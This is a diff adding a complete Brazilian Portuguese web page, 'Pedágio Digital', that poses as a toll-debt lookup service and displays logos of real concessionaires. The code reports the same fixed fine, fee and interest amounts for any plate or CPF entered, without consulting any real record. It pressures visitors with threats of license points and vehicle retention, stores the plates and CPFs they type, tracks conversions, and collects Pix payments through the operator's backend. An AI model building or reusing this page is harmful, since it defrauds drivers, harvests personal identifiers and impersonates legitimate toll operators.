@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pedágio Digital</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #0d0d0d; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .phone-container { width: 100%; max-width: 412px; height: 100vh; background-color: #121212; display: flex; flex-direction: column; overflow-y: auto; position: relative; }
+        .screen { display: none; flex-direction: column; width: 100%; height: 100%; }
+        .screen.active { display: flex; }
+        .hero-section { padding: 40px 24px 20px 24px; background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(18,18,18,1) 100%); }
+        .logo-main { height: 38px; object-fit: contain; margin-bottom: 40px; display: block; }
+        .hero-title { font-size: 24px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; line-height: 1.3; margin-bottom: 12px; }
+        .hero-title span { color: #ccff00; }
+        .hero-subtitle { font-size: 14px; color: #b3b3b3; line-height: 1.4; margin-bottom: 24px; }
+        .search-card { background-color: #eef1f4; border-radius: 16px; padding: 24px; color: #333333; margin: 0 16px 24px 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .card-title { font-size: 18px; font-weight: 600; margin-bottom: 16px; color: #111111; }
+        .type-selector-wrapper { display: flex; background-color: #cbd3dc; padding: 4px; border-radius: 30px; margin-bottom: 16px; position: relative; align-items: center; }
+        .type-btn { flex: 1; text-align: center; padding: 8px 0; font-size: 13px; font-weight: 700; color: #555555; cursor: pointer; z-index: 2; transition: color 0.2s ease; }
+        .type-btn.active { color: #ffffff; }
+        .selector-ball { position: absolute; width: calc(50% - 4px); height: calc(100% - 8px); background-color: #000000; border-radius: 25px; left: 4px; transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1; }
+        .input-group { margin-bottom: 16px; }
+        .input-plate { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; color: #111111; background-color: #f7f9fa; letter-spacing: 1px; text-align: center; }
+        .input-plate::placeholder { color: #a0a5b0; font-weight: 600; letter-spacing: 0px; }
+        .checkbox-container { display: flex; align-items: flex-start; margin-bottom: 14px; cursor: pointer; font-size: 12px; color: #555555; line-height: 1.4; }
+        .checkbox-container input { margin-top: 2px; margin-right: 8px; width: 16px; height: 16px; }
+        .checkbox-container a { color: #555555; text-decoration: underline; }
+        .btn-search { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; text-align: center; }
+        .btn-search.disabled { background-color: #cbd3dc; color: #ffffff; pointer-events: none; }
+        .btn-search.active-btn { background-color: #000000; color: #ccff00; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .link-start { display: block; text-align: center; margin-top: 16px; color: #333333; font-size: 14px; font-weight: 600; text-decoration: underline; }
+        .footer-accordion { margin-top: auto; border-top: 1px solid #222222; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; font-size: 15px; font-weight: 700; background-color: #121212; text-decoration: none; color: #ffffff; transition: background-color 0.2s; }
+        .footer-accordion:hover { background-color: #1a1a1a; }
+        .footer-brands { background-color: #1a1a1a; padding: 24px 16px; text-align: center; font-size: 10px; color: #777777; }
+        .social-icons { margin-bottom: 12px; }
+        .social-icons a { color: #ffffff; font-size: 18px; margin: 0 6px; }
+        .brands-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; align-items: center; justify-items: center; margin-top: 16px; opacity: 0.7; }
+        .brands-grid img { max-width: 85%; height: auto; max-height: 25px; object-fit: contain; }
+        .alert-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 9999; display: none; justify-content: center; align-items: center; padding: 24px; }
+        .alert-box { background-color: #1a1a1a; border: 1px solid #ff3b30; border-radius: 16px; width: 100%; max-width: 360px; padding: 24px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
+        .alert-icon { width: 56px; height: 56px; background-color: rgba(255, 59, 48, 0.15); color: #ff3b30; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 16px auto; }
+        .alert-box-title { font-size: 18px; font-weight: 800; color: #ffffff; margin-bottom: 8px; }
+        .alert-box-desc { font-size: 13px; color: #cccccc; line-height: 1.5; margin-bottom: 20px; }
+        .btn-alert-go { width: 100%; background-color: #ff3b30; color: #ffffff; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .screen-debito { background-color: #f4f6f8; color: #333333; }
+        .header-debito { background-color: #ffffff; padding: 16px; display: flex; align-items: center; border-bottom: 1px solid #e3e8ed; }
+        .btn-back { background: none; border: none; font-size: 18px; color: #333333; cursor: pointer; margin-right: 32px; }
+        .header-title { font-size: 16px; font-weight: 600; flex-grow: 1; text-align: center; margin-right: 40px; }
+        .hero-banner-result { position: relative; width: 100%; height: 120px; background-image: url('assets/fundo.png'); background-size: cover; background-position: center; padding: 16px; display: flex; align-items: flex-start; }
+        .hero-banner-result::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.2); z-index: 1; }
+        .vehicle-label-box { position: relative; z-index: 2; color: #ffffff; display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; }
+        .floating-plate-card { background-color: #ffffff; padding: 16px; border-radius: 12px; font-weight: 700; font-size: 18px; color: #111111; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin: -30px 16px 16px 16px; position: relative; z-index: 3; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #e3e8ed; }
+        .floating-plate-card span { font-size: 12px; background-color: #eef1f4; padding: 4px 8px; border-radius: 6px; color: #555555; font-weight: 500; letter-spacing: 0; }
+        .debito-content { padding: 0 16px 16px 16px; flex-grow: 1; }
+        .debito-status-header { display: flex; justify-content: space-between; font-size: 13px; color: #666666; margin-bottom: 16px; border-bottom: 1px solid #dbe1e6; padding-bottom: 8px; font-weight: 500; }
+        .debt-item-row { background-color: #ffffff; border: 1px solid #e3e8ed; border-radius: 12px; padding: 14px 16px; margin-bottom: 12px; display: flex; align-items: center; gap: 14px; cursor: pointer; }
+        .debt-item-checkbox { width: 20px; height: 20px; accent-color: #34c759; cursor: pointer; }
+        .debt-item-info { flex-grow: 1; }
+        .debt-item-title-line { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
+        .debt-item-name { font-size: 14px; font-weight: 700; color: #111111; }
+        .debt-item-price { font-size: 14px; font-weight: 700; color: #111111; }
+        .debt-item-sub { font-size: 11px; color: #888888; }
+        .btn-pay-now { width: 100%; background-color: #34c759; color: #ffffff; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; margin-bottom: 20px; box-shadow: 0 4px 12px rgba(52, 199, 89, 0.25); }
+        .btn-pay-now.disabled-btn { background-color: #cbd3dc !important; box-shadow: none !important; pointer-events: none; color: #ffffff; }
+        .pix-container { display: none; background-color: #ffffff; border: 1px solid #e3e8ed; border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 16px; }
+        .qr-code-placeholder { width: 180px; height: 180px; margin: 0 auto 16px auto; background-color: #f4f6f8; display: flex; align-items: center; justify-content: center; border-radius: 8px; border: 1px solid #dbe1e6; }
+        .qr-code-placeholder img { width: 100%; height: 100%; object-fit: contain; }
+        .btn-copy { background-color: #000000; color: #ffffff; border: none; padding: 10px 16px; font-size: 13px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-top: 8px; display: inline-flex; align-items: center; gap: 8px; }
+        .info-card { background-color: #eef1f4; border: 1px solid #e3e8ed; border-radius: 12px; padding: 16px; display: flex; gap: 12px; margin-top: 8px; }
+        .info-card i { color: #666666; font-size: 16px; margin-top: 2px; }
+        .info-card p { font-size: 11px; color: #555555; line-height: 1.5; }
+        .payment-footer { background-color: #ffffff; padding: 20px 16px; border-top-left-radius: 16px; border-top-right-radius: 16px; box-shadow: 0 -4px 12px rgba(0,0,0,0.04); margin-top: auto; }
+        .payment-row { display: flex; justify-content: space-between; align-items: center; }
+        .payment-label { font-size: 14px; font-weight: 600; color: #666666; }
+        .payment-value { font-size: 20px; font-weight: 800; color: #000000; }
+        .screen-success { background-color: #ffffff; color: #333333; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 32px; text-align: center; height: 100%; }
+        .success-icon-box { width: 72px; height: 72px; background-color: #e3fbe9; color: #34c759; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; margin-bottom: 24px; }
+        .success-title { font-size: 20px; font-weight: 800; color: #111111; margin-bottom: 12px; }
+        .success-message { font-size: 14px; color: #666666; line-height: 1.5; margin-bottom: 32px; }
+        .success-plate-badge { font-size: 16px; font-weight: 700; background-color: #f4f6f8; padding: 12px 24px; border-radius: 8px; border: 1px solid #e3e8ed; margin-bottom: 40px; letter-spacing: 1px; }
+        .btn-finish { width: 100%; background-color: #000000; color: #ffffff; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="phone-container">
+        <div id="alert-popup" class="alert-overlay">
+            <div class="alert-box">
+                <div class="alert-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
+                <h3 class="alert-box-title">Atenção Condutor!</h3>
+                <p class="alert-box-desc">Evite multas de evasão de pedágio (Infração Grave, 5 pontos na CNH) e a possível retenção do veículo. Regularize todas as pendências em aberto imediatamente.</p>
+                <button id="btn-alert-confirm" class="btn-alert-go">Visualizar Débitos</button>
+            </div>
+        </div>
+
+        <div id="screen-search" class="screen active">
+            <div class="hero-section">
+                <img src="assets/pedagio.png" alt="Pedágio Digital" class="logo-main">
+                <h1 class="hero-title">Desfrute de toda a<br>comodidade do<br>pedágio <span>digital</span></h1>
+                <p class="hero-subtitle">Uma nova era para o pedágio começou: ágil e digital como tem que ser.</p>
+            </div>
+
+            <div class="search-card">
+                <div class="type-selector-wrapper">
+                    <div id="selector-ball" class="selector-ball"></div>
+                    <div id="tab-placa" class="type-btn active">PLACA</div>
+                    <div id="tab-cpf" class="type-btn">CPF</div>
+                </div>
+
+                <p class="card-title" id="card-dynamic-title">Informe uma <strong>placa</strong> válida para consultar:</p>
+                <div class="input-group">
+                    <input type="text" id="plate-input" class="input-plate" placeholder="DIGITE SUA PLACA" maxlength="7">
+                </div>
+                <label class="checkbox-container" id="wrapper-foreign">
+                    <input type="checkbox" id="foreign-plate">
+                    <span>Minha placa é estrangeira</span>
+                </label>
+                <label class="checkbox-container">
+                    <input type="checkbox" id="terms-agree" checked>
+                    <span>Li e concordo com os <a href="#">Termos de uso</a> e <a href="#">Políticas de Privacidade</a> da plataforma Pedágio Digital.</span>
+                </label>
+                <button id="btn-submit" class="btn-search disabled">Buscar débitos</button>
+                <a href="#" class="link-start">Começar agora</a>
+            </div>
+
+            <a href="https://wa.me/5511999999999" target="_blank" class="footer-accordion">
+                <span>Central de atendimento</span>
+                <i class="fa-solid fa-chevron-down"></i>
+            </a>
+
+            <div class="footer-brands">
+                <div class="social-icons">
+                    <a href="#"><i class="fa-brands fa-linkedin"></i></a>
+                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                </div>
+                <p style="margin-bottom: 8px; font-size: 11px;">E-mail: contato@pedagiodigital.com</p>
+                <p>Inovap 5 Administração e Participações LTDA - 11.964.190/0001-83</p>
+                <div class="brands-grid">
+                    <img src="assets/ccr.png" alt="CCR">
+                    <img src="assets/ecovias.png" alt="Ecovias">
+                    <img src="assets/tamoios.png" alt="Tamoios">
+                    <img src="assets/spserra.png" alt="SP Serra">
+                    <img src="assets/cnl.png" alt="CNL" class="row-2">
+                    <img src="assets/eco.png" alt="EcoRodovias" class="row-2">
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-result" class="screen screen-debito">
+            <div class="header-debito">
+                <button class="btn-back" id="btn-back-to-search"><i class="fa-solid fa-chevron-left"></i></button>
+                <h1 class="header-title">Débitos</h1>
+            </div>
+
+            <div class="hero-banner-result">
+                <div class="vehicle-label-box">
+                    <i class="fa-solid fa-car" id="vehicle-icon-label"></i>
+                    <span id="label-result-type">Seu veículo:</span>
+                </div>
+            </div>
+
+            <div class="floating-plate-card">
+                <strong id="result-plate-display">---</strong>
+                <span id="badge-country">Brasil (Mercosul)</span>
+            </div>
+
+            <div class="debito-content">
+                <div class="debito-status-header">
+                    <span>Pendências encontradas</span>
+                    <span id="current-date-time">Atualizado em: --/--/----</span>
+                </div>
+
+                <div id="split-debito-list">
+                    <div class="debt-item-row" onclick="toggleDebtItem('chk-tarifa')">
+                        <input type="checkbox" id="chk-tarifa" class="debt-item-checkbox" data-amount="14.50" checked onclick="event.stopPropagation(); recalculateTotal();">
+                        <div class="debt-item-info">
+                            <div class="debt-item-title-line">
+                                <span class="debt-item-name">Tarifa Base Free Flow</span>
+                                <span class="debt-item-price">R$ 14,50</span>
+                            </div>
+                            <span class="debt-item-sub">Passagem evasiva regulamentar</span>
+                        </div>
+                    </div>
+
+                    <div class="debt-item-row" onclick="toggleDebtItem('chk-multa')">
+                        <input type="checkbox" id="chk-multa" class="debt-item-checkbox" data-amount="15.00" checked onclick="event.stopPropagation(); recalculateTotal();">
+                        <div class="debt-item-info">
+                            <div class="debt-item-title-line">
+                                <span class="debt-item-name">Multa Administrativa</span>
+                                <span class="debt-item-price">R$ 15,00</span>
+                            </div>
+                            <span class="debt-item-sub">Artigo 209 do CTB - Notificação prévia</span>
+                        </div>
+                    </div>
+
+                    <div class="debt-item-row" onclick="toggleDebtItem('chk-juros')">
+                        <input type="checkbox" id="chk-juros" class="debt-item-checkbox" data-amount="4.40" checked onclick="event.stopPropagation(); recalculateTotal();">
+                        <div class="debt-item-info">
+                            <div class="debt-item-title-line">
+                                <span class="debt-item-name">Juros de Mora / Mora Base</span>
+                                <span class="debt-item-price">R$ 4,40</span>
+                            </div>
+                            <span class="debt-item-sub">Atualização de taxa monetária acumulada</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="btn-pay-action" class="btn-pay-now">
+                    <i class="fa-solid fa-barcode"></i> Pagar agora com Pix
+                </button>
+
+                <div id="pix-payment-box" class="pix-container">
+                    <p style="font-size: 13px; font-weight: 700; margin-bottom: 12px; color: #111111;">Escaneie o QR Code abaixo:</p>
+                    <div class="qr-code-placeholder"><img id="pix-qr-img" src="" alt="QR Code Pix"></div>
+                    <p style="font-size: 11px; color: #666666; margin-bottom: 6px;">Ou use o Copia e Cola:</p>
+                    <button id="btn-copy-code" class="btn-copy"><i class="fa-regular fa-copy"></i> Copiar Código Pix</button>
+                </div>
+
+                <div class="info-card">
+                    <i class="fa-solid fa-circle-info"></i>
+                    <p>O pagamento via Pix liquida os débitos de forma imediata na concessionária. Evite multas de trânsito por evasão de pedágio efetuando o pagamento dentro do prazo regulamentar.</p>
+                </div>
+            </div>
+
+            <div class="payment-footer">
+                <div class="payment-row">
+                    <span class="payment-label">Total a pagar:</span>
+                    <span class="payment-value" id="footer-total-text">R$ 33,90</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-success" class="screen screen-success">
+            <div class="success-icon-box"><i class="fa-solid fa-check"></i></div>
+            <h2 class="success-title">Regularizado com sucesso!</h2>
+            <p class="success-message">Nenhuma passagem ou pendência em aberto foi encontrada. Os débitos foram quitados com sucesso.</p>
+            <div class="success-plate-badge" id="success-plate-display">---</div>
+            <button id="btn-success-finish" class="btn-finish">Voltar ao início</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, get, set, onValue, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // MUDANÇA AQUI: Busca as credenciais na nova rota Node.js
+        const responseConfig = await fetch('/api/config');
+        const appConfig = await responseConfig.json();
+
+        const app = initializeApp(appConfig.firebase);
+        const db = getDatabase(app);
+
+        runTransaction(ref(db, 'metricas/views'), (currentValue) => (currentValue || 0) + 1)
+            .catch(err => console.error("Erro ao registrar acesso:", err));
+
+        const plateInput = document.getElementById('plate-input');
+        const btnSubmit = document.getElementById('btn-submit');
+        const screenSearch = document.getElementById('screen-search');
+        const screenResult = document.getElementById('screen-result');
+        const screenSuccess = document.getElementById('screen-success');
+        const btnBack = document.getElementById('btn-back-to-search');
+        const resultPlateDisplay = document.getElementById('result-plate-display');
+        const successPlateDisplay = document.getElementById('success-plate-display');
+        const dateTimeDisplay = document.getElementById('current-date-time');
+        const btnPayAction = document.getElementById('btn-pay-action');
+        const pixPaymentBox = document.getElementById('pix-payment-box');
+        const btnCopyCode = document.getElementById('btn-copy-code');
+        const pixQrImg = document.getElementById('pix-qr-img');
+        const btnSuccessFinish = document.getElementById('btn-success-finish');
+
+        const tabPlaca = document.getElementById('tab-placa');
+        const tabCpf = document.getElementById('tab-cpf');
+        const selectorBall = document.getElementById('selector-ball');
+        const cardDynamicTitle = document.getElementById('card-dynamic-title');
+        const wrapperForeign = document.getElementById('wrapper-foreign');
+        const alertPopup = document.getElementById('alert-popup');
+        const btnAlertConfirm = document.getElementById('btn-alert-confirm');
+        const labelResultType = document.getElementById('label-result-type');
+        const vehicleIconLabel = document.getElementById('vehicle-icon-label');
+        const badgeCountry = document.getElementById('badge-country');
+
+        let unsubscribeRealtime = null; 
+        let stringCopiaColaPix = ""; 
+        let currentType = "placa"; 
+        let currentTotalCalculated = 33.90;
+
+        tabPlaca.addEventListener('click', () => {
+            currentType = "placa";
+            tabPlaca.classList.add('active');
+            tabCpf.classList.remove('active');
+            selectorBall.style.transform = "translateX(0%)";
+            cardDynamicTitle.innerHTML = "Informe uma <strong>placa</strong> válida para consultar:";
+            plateInput.placeholder = "DIGITE SUA PLACA";
+            plateInput.maxLength = 8;
+            wrapperForeign.style.display = "flex";
+            plateInput.value = "";
+            checkInputValidity();
+        });
+
+        tabCpf.addEventListener('click', () => {
+            currentType = "cpf";
+            tabCpf.classList.add('active');
+            tabPlaca.classList.remove('active');
+            selectorBall.style.transform = "translateX(100%)";
+            cardDynamicTitle.innerHTML = "Informe um <strong>CPF</strong> válido para consultar:";
+            plateInput.placeholder = "000.000.000-00";
+            plateInput.maxLength = 14;
+            wrapperForeign.style.display = "none";
+            plateInput.value = "";
+            checkInputValidity();
+        });
+
+        plateInput.addEventListener('input', (e) => {
+            let value = e.target.value;
+            if (currentType === "cpf") {
+                value = value.replace(/\D/g, "");
+                if (value.length > 11) value = value.slice(0, 11);
+                value = value.replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+                e.target.value = value;
+            } else {
+                value = value.toUpperCase().replace(/[^A-Z0-9]/g, "");
+                if (value.length > 7) value = value.slice(0, 7);
+                if (value.length === 7 && /^[A-Z]{3}\d{4}$/.test(value)) {
+                    value = value.slice(0, 3) + "-" + value.slice(3);
+                }
+                e.target.value = value;
+            }
+            checkInputValidity();
+        });
+
+        function checkInputValidity() {
+            const rawLength = plateInput.value.replace(/[^A-Z0-9]/g, "").length;
+            if ((currentType === "cpf" && rawLength === 11) || (currentType === "placa" && rawLength >= 7)) {
+                btnSubmit.classList.remove('disabled');
+                btnSubmit.classList.add('active-btn');
+            } else {
+                btnSubmit.classList.remove('active-btn');
+                btnSubmit.classList.add('disabled');
+            }
+        }
+
+        window.toggleDebtItem = function(id) {
+            const chk = document.getElementById(id);
+            chk.checked = !chk.checked;
+            recalculateTotal();
+        };
+
+        window.recalculateTotal = function() {
+            let total = 0;
+            document.querySelectorAll('.debt-item-checkbox').forEach(box => {
+                if (box.checked) total += parseFloat(box.getAttribute('data-amount'));
+            });
+            currentTotalCalculated = total;
+            document.getElementById('footer-total-text').textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            if (total === 0) btnPayAction.classList.add('disabled-btn');
+            else btnPayAction.classList.remove('disabled-btn');
+        };
+
+        btnSubmit.addEventListener('click', () => {
+            if (btnSubmit.classList.contains('disabled')) return;
+            alertPopup.style.display = "flex";
+        });
+
+        btnAlertConfirm.addEventListener('click', async () => {
+            alertPopup.style.display = "none";
+            const entrada = plateInput.value.trim().toUpperCase();
+            const entradaLimpa = entrada.replace(/[^A-Z0-9]/g, "");
+            
+            btnSubmit.innerText = "Consultando...";
+            btnSubmit.style.pointerEvents = "none";
+            btnSubmit.style.opacity = "0.7";
+
+            if (currentType === "placa") {
+                labelResultType.textContent = "Seu veículo:";
+                vehicleIconLabel.className = "fa-solid fa-car";
+                badgeCountry.textContent = "Brasil (Mercosul)";
+            } else {
+                labelResultType.textContent = "Seu documento:";
+                vehicleIconLabel.className = "fa-solid fa-id-card";
+                badgeCountry.textContent = "Contribuinte CPF";
+            }
+
+            resultPlateDisplay.textContent = entrada;
+            successPlateDisplay.textContent = entrada;
+            
+            const agora = new Date();
+            dateTimeDisplay.textContent = `Atualizado em: ${String(agora.getDate()).padStart(2, '0')}/${String(agora.getMonth() + 1).padStart(2, '0')}/${agora.getFullYear()}`;
+
+            try {
+                const configSnapshot = await get(ref(db, 'configuracoes/taxas'));
+                if (configSnapshot.exists()) {
+                    const taxas = configSnapshot.val();
+                    const setTax = (id, val) => {
+                        const elem = document.getElementById(id);
+                        elem.setAttribute('data-amount', val);
+                        elem.nextElementSibling.querySelector('.debt-item-price').textContent = parseFloat(val).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+                    };
+                    setTax('chk-tarifa', taxas.base);
+                    setTax('chk-multa', taxas.fine);
+                    setTax('chk-juros', taxas.interest);
+                }
+            } catch (err) {
+                console.error("Erro ao buscar taxas:", err);
+            }
+
+            document.querySelectorAll('.debt-item-checkbox').forEach(box => box.checked = true);
+            recalculateTotal();
+
+            try {
+                const dbRef = ref(db, 'veiculos/' + entradaLimpa);
+                const snapshot = await get(dbRef);
+
+                if (snapshot.exists() && snapshot.val().status === "pago") {
+                    abrirTela(screenSuccess);
+                } else {
+                    if (!snapshot.exists()) {
+                        await set(dbRef, {
+                            placa: entradaLimpa,
+                            valor: currentTotalCalculated,
+                            status: "pendente",
+                            tipo_busca: currentType,
+                            data_consulta: agora.toISOString()
+                        });
+                    }
+                    btnPayAction.style.display = "flex";
+                    pixPaymentBox.style.display = "none";
+                    resetarBotaoPagamento();
+                    abrirTela(screenResult);
+                    ativarOuvinteRealtime(entradaLimpa);
+                }
+            } catch (error) {
+                console.error(error);
+                abrirTela(screenResult);
+            } finally {
+                btnSubmit.innerText = "Buscar débitos";
+                btnSubmit.style.pointerEvents = "auto";
+                btnSubmit.style.opacity = "1";
+            }
+        });
+
+        btnPayAction.addEventListener('click', async () => {
+            if (btnPayAction.classList.contains('disabled-btn')) return;
+            const entradaLimpa = plateInput.value.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
+            const valorTexto = document.getElementById('footer-total-text').textContent;
+            const valorNumerico = parseFloat(valorTexto.replace('R$', '').replace(/\./g, '').replace(',', '.'));
+
+            btnPayAction.innerText = "Gerando Pix...";
+            btnPayAction.style.pointerEvents = "none";
+            btnPayAction.style.opacity = "0.7";
+
+            runTransaction(ref(db, 'metricas/clicks'), (curr) => (curr || 0) + 1).catch(err => console.error(err));
+
+            try {
+                // MUDANÇA AQUI: Chamada enviada para a rota /api/gerar-pix
+                const resposta = await fetch('/api/gerar-pix', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        placa: entradaLimpa,
+                        valor: valorNumerico, 
+                        acao: 'gerar_pix',
+                        modelo_carro: currentType === "placa" ? "Tarifa Veicular" : "Tarifa Vinculada CPF"
+                    })
+                });
+
+                const dadosPix = await resposta.json();
+                if (dadosPix.qr_code_url) {
+                    pixQrImg.src = dadosPix.qr_code_url; 
+                    stringCopiaColaPix = dadosPix.copy_paste; 
+                    btnPayAction.style.display = "none";
+                    pixPaymentBox.style.display = "block";
+                } else {
+                    alert("Erro ao gerar Pix: " + (dadosPix.error || "Tente novamente."));
+                    resetarBotaoPagamento();
+                }
+            } catch (error) {
+                alert("Erro de conexão ao gerar o Pix.");
+                resetarBotaoPagamento();
+            }
+        });
+
+        btnCopyCode.addEventListener('click', () => {
+            if (stringCopiaColaPix) {
+                navigator.clipboard.writeText(stringCopiaColaPix);
+                btnCopyCode.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
+                setTimeout(() => { btnCopyCode.innerHTML = '<i class="fa-regular fa-copy"></i> Copiar Código Pix'; }, 2000);
+            }
+        });
+
+        function resetarBotaoPagamento() {
+            btnPayAction.innerText = "Pagar agora com Pix";
+            btnPayAction.style.pointerEvents = "auto";
+            btnPayAction.style.opacity = "1";
+        }
+
+        function ativarOuvinteRealtime(placa) {
+            const dbRef = ref(db, 'veiculos/' + placa.toString().trim().toUpperCase());
+            if (unsubscribeRealtime) unsubscribeRealtime();
+            
+            unsubscribeRealtime = onValue(dbRef, (snapshot) => {
+                const dados = snapshot.val();
+                if (dados && dados.status) {
+                    const status = dados.status.toString().toUpperCase();
+                    if (status === "PAGO" || status === "COMPLETED") {
+                        abrirTela(screenSuccess);
+                    }
+                }
+            });
+        }
+
+        btnBack.addEventListener('click', () => {
+            if (unsubscribeRealtime) { unsubscribeRealtime(); unsubscribeRealtime = null; }
+            abrirTela(screenSearch);
+        });
+
+        btnSuccessFinish.addEventListener('click', () => {
+            plateInput.value = "";
+            btnSubmit.classList.remove('active-btn');
+            btnSubmit.classList.add('disabled');
+            abrirTela(screenSearch);
+        });
+
+        function abrirTela(telaAlvo) {
+            screenSearch.classList.remove('active');
+            screenResult.classList.remove('active');
+            screenSuccess.style.display = "none";
+            if (telaAlvo === screenSuccess) telaAlvo.style.display = "flex";
+            else telaAlvo.classList.add('active');
+        }
+    </script>
+</body>
+</html>
